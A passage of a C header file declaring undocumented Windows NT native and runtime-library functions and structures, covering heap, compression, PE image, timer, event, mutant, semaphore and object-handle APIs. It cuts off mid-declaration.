VOID NTAPI RtlSetLastWin32Error(
    _In_ LONG Win32Error);

NTSTATUS NTAPI RtlGetLastNtStatus(
    VOID);

LONG NTAPI RtlGetLastWin32Error(
    VOID);

ULONG RtlNtStatusToDosErrorNoTeb(
    _In_ NTSTATUS Status);

VOID NTAPI RtlSetLastWin32ErrorAndNtStatusFromNtStatus(
    _In_ NTSTATUS Status);

/************************************************************************************
*
* RTL WOW64 Support API.
*
************************************************************************************/

NTSTATUS NTAPI RtlWow64EnableFsRedirection(
    _In_ BOOLEAN Wow64FsEnableRedirection);

NTSTATUS NTAPI RtlWow64EnableFsRedirectionEx(
    _In_ PVOID DisableFsRedirection,
    _Out_ PVOID *OldFsRedirectionLevel);

/************************************************************************************
*
* RTL Heap Management API.
*
************************************************************************************/

typedef NTSTATUS(NTAPI * PRTL_HEAP_COMMIT_ROUTINE)(
    _In_  PVOID Base,
    _Inout_ PVOID *CommitAddress,
    _Inout_ PSIZE_T CommitSize
    );

typedef struct _RTL_HEAP_PARAMETERS {
    ULONG Length;
    SIZE_T SegmentReserve;
    SIZE_T SegmentCommit;
    SIZE_T DeCommitFreeBlockThreshold;
    SIZE_T DeCommitTotalFreeThreshold;
    SIZE_T MaximumAllocationSize;
    SIZE_T VirtualMemoryThreshold;
    SIZE_T InitialCommit;
    SIZE_T InitialReserve;
    PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;
    SIZE_T Reserved[2];
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

PVOID NTAPI RtlCreateHeap(
    _In_ ULONG Flags,
    _In_opt_ PVOID HeapBase,
    _In_opt_ SIZE_T ReserveSize,
    _In_opt_ SIZE_T CommitSize,
    _In_opt_ PVOID Lock,
    _In_opt_ PRTL_HEAP_PARAMETERS Parameters);

PVOID NTAPI RtlDestroyHeap(
    _In_ PVOID HeapHandle);

NTSTATUS NTAPI RtlSetHeapInformation(
    _In_ PVOID HeapHandle,
    _In_ HEAP_INFORMATION_CLASS HeapInformationClass,
    _In_opt_ PVOID HeapInformation,
    _In_opt_ SIZE_T HeapInformationLength);

NTSTATUS NTAPI RtlQueryHeapInformation(
    _In_ PVOID HeapHandle,
    _In_ HEAP_INFORMATION_CLASS HeapInformationClass,
    _Out_opt_ PVOID HeapInformation,
    _In_opt_ SIZE_T HeapInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

PVOID NTAPI RtlAllocateHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _In_ SIZE_T Size);

BOOLEAN NTAPI RtlFreeHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _In_ PVOID BaseAddress);

NTSTATUS NTAPI RtlZeroHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags);

SIZE_T NTAPI RtlSizeHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _In_ PVOID BaseAddress);

VOID NTAPI RtlProtectHeap(
    _In_ PVOID HeapHandle,
    _In_ BOOLEAN MakeReadOnly);

PVOID NTAPI RtlReAllocateHeap(
    _In_ PVOID HeapHandle,
    _In_ ULONG Flags,
    _Frees_ptr_opt_ PVOID BaseAddress,
    _In_ SIZE_T Size);

ULONG NTAPI RtlGetProcessHeaps(
    _In_ ULONG NumberOfHeaps,
    _Out_ PVOID *ProcessHeaps);

typedef NTSTATUS(NTAPI *PRTL_ENUM_HEAPS_ROUTINE)(
    _In_ PVOID HeapHandle,
    _In_ PVOID Parameter
    );

NTSTATUS NTAPI RtlEnumProcessHeaps(
    _In_ PRTL_ENUM_HEAPS_ROUTINE EnumRoutine,
    _In_ PVOID Parameter);

/************************************************************************************
*
* RTL Compression API.
*
************************************************************************************/

NTSTATUS NTAPI RtlGetCompressionWorkSpaceSize(
    _In_ USHORT CompressionFormatAndEngine,
    _Out_ PULONG CompressBufferWorkSpaceSize,
    _Out_ PULONG CompressFragmentWorkSpaceSize);

NTSTATUS NTAPI RtlCompressBuffer(
    _In_ USHORT CompressionFormatAndEngine,
    _In_ PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _Out_ PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _In_ ULONG UncompressedChunkSize,
    _Out_ PULONG FinalCompressedSize,
    _In_ PVOID WorkSpace);

NTSTATUS NTAPI RtlDecompressBuffer(
    _In_ USHORT CompressionFormat,
    _Out_ PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _In_ PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _Out_ PULONG FinalUncompressedSize);

NTSTATUS NTAPI RtlDecompressBufferEx(
    _In_ USHORT CompressionFormat,
    _Out_writes_bytes_to_(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer,
    _In_ ULONG UncompressedBufferSize,
    _In_reads_bytes_(CompressedBufferSize) PUCHAR CompressedBuffer,
    _In_ ULONG CompressedBufferSize,
    _Out_ PULONG FinalUncompressedSize,
    _In_ PVOID WorkSpace);

/************************************************************************************
*
* RTL Image API.
*
************************************************************************************/

#define RTL_IMAGE_NT_HEADER_EX_FLAG_NO_RANGE_CHECK (0x00000001)

PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(
    _In_ PVOID Base);

NTSTATUS NTAPI RtlImageNtHeaderEx(
    _In_ ULONG Flags,
    _In_ PVOID Base,
    _In_ ULONG64 Size,
    _Out_ PIMAGE_NT_HEADERS * OutHeaders);

NTSYSAPI PVOID NTAPI RtlAddressInSectionTable(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID BaseOfImage,
    _In_ ULONG VirtualAddress);

PIMAGE_SECTION_HEADER NTAPI RtlSectionTableFromVirtualAddress(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID BaseOfImage,
    _In_ ULONG VirtualAddress);

PVOID NTAPI RtlImageDirectoryEntryToData(
    _In_ PVOID BaseOfImage,
    _In_ BOOLEAN MappedAsImage,
    _In_ USHORT DirectoryEntry,
    _Out_ PULONG Size);

PIMAGE_SECTION_HEADER NTAPI RtlImageRvaToSection(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID Base,
    _In_ ULONG Rva);

PVOID NTAPI RtlImageRvaToVa(
    _In_ PIMAGE_NT_HEADERS NtHeaders,
    _In_ PVOID Base,
    _In_ ULONG Rva,
    _Inout_opt_ PIMAGE_SECTION_HEADER *LastRvaSection);

/************************************************************************************
*
* RTL Time API.
*
************************************************************************************/

VOID NTAPI RtlSecondsSince1970ToTime(
    _In_ ULONG ElapsedSeconds,
    _Out_ PLARGE_INTEGER Time);

VOID NTAPI RtlSecondsSince1980ToTime(
    _In_ ULONG ElapsedSeconds,
    _Out_ PLARGE_INTEGER Time);

BOOLEAN NTAPI RtlTimeToSecondsSince1980(
    _In_ PLARGE_INTEGER Time,
    _Out_ PULONG ElapsedSeconds);

VOID NTAPI RtlTimeToTimeFields(
    _In_ PLARGE_INTEGER Time,
    _Out_ PTIME_FIELDS TimeFields);

BOOLEAN NTAPI RtlTimeFieldsToTime(
    _In_ PTIME_FIELDS TimeFields,
    _Out_ PLARGE_INTEGER Time);

/************************************************************************************
*
* RTL Debug Support API.
*
************************************************************************************/

ULONG DbgPrint(
    _In_ PCH Format,
    ...);

/************************************************************************************
*
* RTL AVL Tree API.
*
************************************************************************************/

typedef enum _TABLE_SEARCH_RESULT {
    TableEmptyTree,
    TableFoundNode,
    TableInsertAsLeft,
    TableInsertAsRight
} TABLE_SEARCH_RESULT;

typedef enum _RTL_GENERIC_COMPARE_RESULTS {
    GenericLessThan,
    GenericGreaterThan,
    GenericEqual
} RTL_GENERIC_COMPARE_RESULTS;

typedef struct _RTL_AVL_TABLE RTL_AVL_TABLE;
typedef struct PRTL_AVL_TABLE *_RTL_AVL_TABLE;

typedef RTL_GENERIC_COMPARE_RESULTS(NTAPI *PRTL_AVL_COMPARE_ROUTINE)(
    _In_  _RTL_AVL_TABLE *Table,
    _In_ PVOID FirstStruct,
    _In_ PVOID SecondStruct
    );

typedef PVOID(NTAPI *PRTL_AVL_ALLOCATE_ROUTINE)(
    _In_ _RTL_AVL_TABLE *Table,
    _In_ ULONG ByteSize
    );

typedef VOID(NTAPI *PRTL_AVL_FREE_ROUTINE)(
    _In_  _RTL_AVL_TABLE *Table,
    _In_ _Post_invalid_ PVOID Buffer
    );

typedef NTSTATUS(NTAPI *PRTL_AVL_MATCH_FUNCTION)(
    _In_  _RTL_AVL_TABLE *Table,
    _In_ PVOID UserData,
    _In_ PVOID MatchData
    );

typedef struct _RTL_BALANCED_LINKS {
    struct _RTL_BALANCED_LINKS *Parent;
    struct _RTL_BALANCED_LINKS *LeftChild;
    struct _RTL_BALANCED_LINKS *RightChild;
    CHAR Balance;
    UCHAR Reserved[3];
} RTL_BALANCED_LINKS, *PRTL_BALANCED_LINKS;

typedef struct _RTL_AVL_TABLE {
    RTL_BALANCED_LINKS BalancedRoot;
    PVOID OrderedPointer;
    ULONG WhichOrderedElement;
    ULONG NumberGenericTableElements;
    ULONG DepthOfTree;
    PRTL_BALANCED_LINKS RestartKey;
    ULONG DeleteCount;
    PRTL_AVL_COMPARE_ROUTINE CompareRoutine;
    PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine;
    PRTL_AVL_FREE_ROUTINE FreeRoutine;
    PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

VOID NTAPI RtlInitializeGenericTableAvl(
    _Out_ PRTL_AVL_TABLE Table,
    _In_ PRTL_AVL_COMPARE_ROUTINE CompareRoutine,
    _In_ PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine,
    _In_ PRTL_AVL_FREE_ROUTINE FreeRoutine,
    _In_opt_ PVOID TableContext);

PVOID NTAPI RtlInsertElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ CLONG BufferSize,
    _Out_opt_ PBOOLEAN NewElement);

PVOID NTAPI RtlInsertElementGenericTableFullAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ CLONG BufferSize,
    _Out_opt_ PBOOLEAN NewElement,
    _In_ PVOID NodeOrParent,
    _In_ TABLE_SEARCH_RESULT SearchResult);

BOOLEAN NTAPI RtlDeleteElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer);

PVOID NTAPI RtlLookupElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer);

PVOID NTAPI RtlLookupElementGenericTableFullAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer,
    _Out_ PVOID *NodeOrParent,
    _Out_ TABLE_SEARCH_RESULT *SearchResult);

PVOID NTAPI RtlEnumerateGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ BOOLEAN Restart);

PVOID NTAPI RtlEnumerateGenericTableWithoutSplayingAvl(
    _In_ PRTL_AVL_TABLE Table,
    _Inout_ PVOID *RestartKey);

PVOID NTAPI RtlLookupFirstMatchingElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ PVOID Buffer,
    _Out_ PVOID *RestartKey);

PVOID NTAPI RtlEnumerateGenericTableLikeADirectory(
    _In_ PRTL_AVL_TABLE Table,
    _In_opt_ PRTL_AVL_MATCH_FUNCTION MatchFunction,
    _In_opt_ PVOID MatchData,
    _In_ ULONG NextFlag,
    _Inout_ PVOID *RestartKey,
    _Inout_ PULONG DeleteCount,
    _In_ PVOID Buffer);

PVOID NTAPI RtlGetElementGenericTableAvl(
    _In_ PRTL_AVL_TABLE Table,
    _In_ ULONG I);

ULONG NTAPI RtlNumberGenericTableElementsAvl(
    _In_ PRTL_AVL_TABLE Table);

BOOLEAN NTAPI RtlIsGenericTableEmptyAvl(
    _In_ PRTL_AVL_TABLE Table);

/************************************************************************************
*
* RTL Critical Section Support API.
*
************************************************************************************/

NTSTATUS NTAPI RtlEnterCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSTATUS NTAPI RtlLeaveCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

LOGICAL NTAPI RtlIsCriticalSectionLocked(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

LOGICAL NTAPI RtlIsCriticalSectionLockedByThread(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

ULONG NTAPI RtlGetCriticalSectionRecursionCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

LOGICAL NTAPI RtlTryEnterCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

NTSTATUS NTAPI RtlInitializeCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

VOID NTAPI RtlEnableEarlyCriticalSectionEventCreation(
    VOID);

NTSTATUS NTAPI RtlInitializeCriticalSectionAndSpinCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection,
    _In_ ULONG SpinCount);

ULONG NTAPI RtlSetCriticalSectionSpinCount(
    _In_ PRTL_CRITICAL_SECTION CriticalSection,
    _In_ ULONG SpinCount);

NTSTATUS NTAPI RtlDeleteCriticalSection(
    _In_ PRTL_CRITICAL_SECTION CriticalSection);

/************************************************************************************
*
* RTL SRW Lock Support API.
*
************************************************************************************/

VOID NTAPI RtlInitializeSRWLock(
    _Out_ PRTL_SRWLOCK SRWLock);

VOID NTAPI RtlAcquireSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

VOID NTAPI RtlAcquireSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

VOID NTAPI RtlReleaseSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

VOID NTAPI RtlReleaseSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

BOOLEAN NTAPI RtlTryAcquireSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

BOOLEAN NTAPI RtlTryAcquireSRWLockShared(
    _Inout_ PRTL_SRWLOCK SRWLock);

VOID NTAPI RtlAcquireReleaseSRWLockExclusive(
    _Inout_ PRTL_SRWLOCK SRWLock);

VOID NTAPI RtlUpdateClonedSRWLock(
    _Inout_ PRTL_SRWLOCK SRWLock,
    _In_ LOGICAL Shared);

/************************************************************************************
*
* RTL UAC Support API.
*
************************************************************************************/

#define DBG_FLAG_ELEVATION_ENABLED        1
#define DBG_FLAG_VIRTUALIZATION_ENABLED   2
#define DBG_FLAG_INSTALLER_DETECT_ENABLED 3

NTSTATUS NTAPI RtlQueryElevationFlags(
    _Inout_ ULONG *ElevationFlags);

/************************************************************************************
*
* RTL Misc Support API.
*
************************************************************************************/

BOOLEAN NTAPI RtlDoesFileExists_U(
    _In_ PCWSTR FileName);

/************************************************************************************
*
* RTL Boundary Descriptor API.
*
************************************************************************************/

PVOID NTAPI RtlCreateBoundaryDescriptor(
    _In_ PUNICODE_STRING Name,
    _In_ ULONG Flags);

VOID NTAPI RtlDeleteBoundaryDescriptor(
    _In_ PVOID BoundaryDescriptor);

NTSTATUS NTAPI RtlAddSIDToBoundaryDescriptor(
    _Inout_ PVOID *BoundaryDescriptor,
    _In_ PSID RequiredSid);

NTSTATUS NTAPI RtlAddIntegrityLabelToBoundaryDescriptor(
    _Inout_ PVOID *BoundaryDescriptor,
    _In_ PSID IntegrityLabel);


/************************************************************************************
*
* ETW API.
*
************************************************************************************/

struct _EVENT_FILTER_DESCRIPTOR;

typedef VOID(NTAPI *PENABLECALLBACK)(
    _In_ LPCGUID SourceId,
    _In_ ULONG IsEnabled,
    _In_ UCHAR Level,
    _In_ ULONGLONG MatchAnyKeyword,
    _In_ ULONGLONG MatchAllKeyword,
    _In_opt_ struct _EVENT_FILTER_DESCRIPTOR *FilterData,
    _Inout_opt_ PVOID CallbackContext
    );

NTSTATUS NTAPI EtwEventRegister(
    _In_ LPCGUID ProviderId,
    _In_opt_ PENABLECALLBACK EnableCallback,
    _In_opt_ PVOID CallbackContext,
    _Out_ PREGHANDLE RegHandle);

/*
** Runtime Library API END
*/

/*
** Native API START
*/

/************************************************************************************
*
* System Information API.
*
************************************************************************************/

NTSTATUS WINAPI NtQuerySystemInformation(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Inout_ PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtQuerySystemInformationEx(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _In_reads_bytes_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtSetSystemInformation(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _In_opt_ PVOID SystemInformation,
    _In_ ULONG SystemInformationLength);

/************************************************************************************
*
* Event (EventPair) API.
*
************************************************************************************/

typedef enum _EVENT_INFORMATION_CLASS {
    EventBasicInformation
} EVENT_INFORMATION_CLASS;

typedef enum _EVENT_TYPE {
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;

typedef struct _EVENT_BASIC_INFORMATION {
    EVENT_TYPE EventType;
    LONG EventState;
} EVENT_BASIC_INFORMATION, *PEVENT_BASIC_INFORMATION;

NTSTATUS NTAPI NtCreateEvent(
    _Out_ PHANDLE EventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ EVENT_TYPE EventType,
    _In_ BOOLEAN InitialState);

NTSTATUS NTAPI NtOpenEvent(
    _Out_ PHANDLE EventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtSetEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSTATUS NTAPI NtClearEvent(
    _In_ HANDLE EventHandle);

NTSTATUS NTAPI NtResetEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSTATUS NTAPI NtPulseEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState);

NTSTATUS NTAPI NtOpenKeyedEvent(
    _Out_ PHANDLE KeyedEventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQueryEvent(
    _In_ HANDLE EventHandle,
    _In_ EVENT_INFORMATION_CLASS EventInformationClass,
    _Out_ PVOID EventInformation,
    _In_ ULONG EventInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtCreateEventPair(
    _Out_ PHANDLE EventPairHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtOpenEventPair(
    _Out_ PHANDLE EventPairHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtSetLowEventPair(
    _In_ HANDLE EventPairHandle);

NTSTATUS NTAPI NtSetHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSTATUS NTAPI NtWaitLowEventPair(
    _In_ HANDLE EventPairHandle);

NTSTATUS NTAPI NtWaitHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSTATUS NTAPI NtSetLowWaitHighEventPair(
    _In_ HANDLE EventPairHandle);

NTSTATUS NTAPI NtSetHighWaitLowEventPair(
    _In_ HANDLE EventPairHandle);

/************************************************************************************
*
* Mutant API.
*
************************************************************************************/

typedef enum _MUTANT_INFORMATION_CLASS {
    MutantBasicInformation,
    MutantOwnerInformation
} MUTANT_INFORMATION_CLASS;

typedef struct _MUTANT_BASIC_INFORMATION {
    LONG CurrentCount;
    BOOLEAN OwnedByCaller;
    BOOLEAN AbandonedState;
} MUTANT_BASIC_INFORMATION, *PMUTANT_BASIC_INFORMATION;

typedef struct _MUTANT_OWNER_INFORMATION {
    CLIENT_ID ClientId;
} MUTANT_OWNER_INFORMATION, *PMUTANT_OWNER_INFORMATION;

NTSTATUS NTAPI NtCreateMutant(
    _Out_ PHANDLE MutantHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ BOOLEAN InitialOwner);

NTSTATUS NTAPI NtOpenMutant(
    _Out_ PHANDLE MutantHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQueryMutant(
    _In_ HANDLE MutantHandle,
    _In_ MUTANT_INFORMATION_CLASS MutantInformationClass,
    _Out_ PVOID MutantInformation,
    _In_ ULONG MutantInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtReleaseMutant(
    _In_ HANDLE MutantHandle,
    _Out_opt_ PLONG PreviousCount);

/************************************************************************************
*
* Timer API.
*
************************************************************************************/

typedef VOID(*PTIMER_APC_ROUTINE) (
    _In_ PVOID TimerContext,
    _In_ ULONG TimerLowValue,
    _In_ LONG TimerHighValue
    );

typedef enum _TIMER_TYPE {
    NotificationTimer,
    SynchronizationTimer
} TIMER_TYPE;

typedef enum _TIMER_INFORMATION_CLASS {
    TimerBasicInformation
} TIMER_INFORMATION_CLASS;

typedef struct _TIMER_BASIC_INFORMATION {
    LARGE_INTEGER RemainingTime;
    BOOLEAN TimerState;
} TIMER_BASIC_INFORMATION, *PTIMER_BASIC_INFORMATION;

typedef enum _TIMER_SET_INFORMATION_CLASS {
    TimerSetCoalescableTimer,
    MaxTimerInfoClass
} TIMER_SET_INFORMATION_CLASS;

NTSTATUS NTAPI NtCreateTimer(
    _In_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TIMER_TYPE TimerType);

NTSTATUS NTAPI NtSetTimer(
    _In_ HANDLE TimerHandle,
    _In_ PLARGE_INTEGER DueTime,
    _In_opt_ PTIMER_APC_ROUTINE TimerApcRoutine,
    _In_opt_ PVOID TimerContext,
    _In_ BOOLEAN WakeTimer,
    _In_opt_ LONG Period,
    _Out_opt_ PBOOLEAN PreviousState);

NTSTATUS NTAPI NtSetTimerEx(
    _In_ HANDLE TimerHandle,
    _In_ TIMER_SET_INFORMATION_CLASS TimerSetInformationClass,
    _Inout_updates_bytes_opt_(TimerSetInformationLength) PVOID TimerSetInformation,
    _In_ ULONG TimerSetInformationLength);

NTSTATUS NTAPI NtOpenTimer(
    _In_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQueryTimer(
    _In_ HANDLE TimerHandle,
    _In_ TIMER_INFORMATION_CLASS TimerInformationClass,
    _Out_ PVOID TimerInformation,
    _In_ ULONG TimerInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtCancelTimer(
    _In_ HANDLE TimerHandle,
    _Out_opt_ PBOOLEAN CurrentState);

//ref from ph2

NTSTATUS NTAPI NtCreateIRTimer(
    _Out_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess);

NTSTATUS NTAPI NtSetIRTimer(
    _In_ HANDLE TimerHandle,
    _In_opt_ PLARGE_INTEGER DueTime);

NTSTATUS NTAPI NtCreateTimer2(
    _Out_ PHANDLE TimerHandle,
    _In_opt_ PVOID Reserved1,
    _In_opt_ PVOID Reserved2,
    _In_ ULONG Attributes,
    _In_ ACCESS_MASK DesiredAccess);

/************************************************************************************
*
* Semaphore API.
*
************************************************************************************/

typedef enum _SEMAPHORE_INFORMATION_CLASS {
    SemaphoreBasicInformation
} SEMAPHORE_INFORMATION_CLASS;

typedef struct _SEMAPHORE_BASIC_INFORMATION {
    LONG CurrentCount;
    LONG MaximumCount;
} SEMAPHORE_BASIC_INFORMATION, *PSEMAPHORE_BASIC_INFORMATION;

NTSTATUS NTAPI NtCreateSemaphore(
    _Out_ PHANDLE SemaphoreHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ LONG InitialCount,
    _In_ LONG MaximumCount);

NTSTATUS NTAPI NtOpenSemaphore(
    _Out_ PHANDLE SemaphoreHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQuerySemaphore(
    _In_ HANDLE SemaphoreHandle,
    _In_ SEMAPHORE_INFORMATION_CLASS SemaphoreInformationClass,
    _Out_ PVOID SemaphoreInformation,
    _In_ ULONG SemaphoreInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtReleaseSemaphore(
    _In_ HANDLE SemaphoreHandle,
    _In_ LONG ReleaseCount,
    _Out_opt_ PLONG PreviousCount);

/************************************************************************************
*
* Object and Handle API.
*
************************************************************************************/
typedef enum _OBJECT_INFORMATION_CLASS {
    ObjectBasicInformation,
    ObjectNameInformation,
    ObjectTypeInformation,
    ObjectTypesInformation,
    ObjectHandleFlagInformation,
    ObjectSessionInformation,
    ObjectSessionObjectInformation,
    MaxObjectInfoClass
} OBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

typedef struct _OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG Reserved[3];
    ULONG NameInfoSize;
    ULONG TypeInfoSize;
    ULONG SecurityDescriptorSize;
    LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION {
    UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION_V2 {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    UCHAR TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION_V2, *POBJECT_TYPE_INFORMATION_V2;

typedef struct _OBJECT_TYPES_INFORMATION {
    ULONG NumberOfTypes;
} OBJECT_TYPES_INFORMATION, *POBJECT_TYPES_INFORMATION;

#define OBJECT_TYPES_FIRST_ENTRY(ObjectTypes) (POBJECT_TYPE_INFORMATION)\
    RtlOffsetToPointer(ObjectTypes, ALIGN_UP(sizeof(OBJECT_TYPES_INFORMATION), ULONG_PTR))

#define OBJECT_TYPES_NEXT_ENTRY(ObjectType) (POBJECT_TYPE_INFORMATION)\
    RtlOffsetToPointer(ObjectType, sizeof(OBJECT_TYPE_INFORMATION) + \
    ALIGN_UP(ObjectType->TypeName.MaximumLength, ULONG_PTR))

typedef struct _OBJECT_HANDLE_FLAG_INFORMATION {
    BOOLEAN Inherit;
    BOOLEAN ProtectFromClose;
} OBJECT_HANDLE_FLAG_INFORMATION, *POBJECT_HANDLE_FLAG_INFORMATION;

NTSTATUS NTAPI NtClose(
    _In_ HANDLE Handle);

NTSTATUS NTAPI NtDuplicateObject(
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _In_opt_ HANDLE TargetProcessHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options);

NTSTATUS NTAPI NtMakePermanentObject(
    _In_ HANDLE Handle);

NTSTATUS NTAPI NtMakeTemporaryObject(
    _In_ HANDLE Handle);

NTSTATUS NTAPI NtSetSecurityObject(
    _In_ HANDLE Handle,
    _In_ SECURITY_INFORMATION SecurityInformation,
